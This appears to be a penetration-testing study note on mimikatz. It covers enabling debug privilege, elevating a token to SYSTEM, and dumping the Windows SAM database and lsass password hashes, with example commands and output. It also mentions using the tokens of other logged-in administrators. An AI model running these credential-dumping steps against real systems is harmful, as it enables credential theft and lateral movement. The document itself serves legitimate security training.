

Dumps SAM database  
Extracts pw hashes from **lsass**' (Local Security Authority Subsystem) process memory.  
  
  
As **lsass** is privileged process running under SYSTEM, we have to start **mimikatz** from an admin cmd prompt.  
  
  
Usage:  
```powershell
C:\Tools\password_attacks\mimikatz.exe  
...  
mimikatz # privilege::debug  
Privilege '20' OK  
  
mimikatz # token::elevate  
Token Id  :  0  
User name  :  
SID name  :  NT AUTHORITY\SYSTEM  
....  
-> Impersonated !  
....  
```


**privilege::debug** - Enables the _SeDebugPrivilge_ access right req to tamper w/ another process.  
	*If fails, mimikatz was most likely not executed w/in an admin cmd prompt  
  
**token::elevate** - Elevates security token from High Integrity (admin) to SYSTEM Integrity.  
	*If launched from a system shell, this step's not required.  
  
	It is worth noting that the token module may list (**token::list**) & use (**token::elevate**) tokens for all users currently logged into the machine,  
	which in some cases could be an administrator of someother machine.  
  
  
**lsadump::sam** - Dump contents of SAM db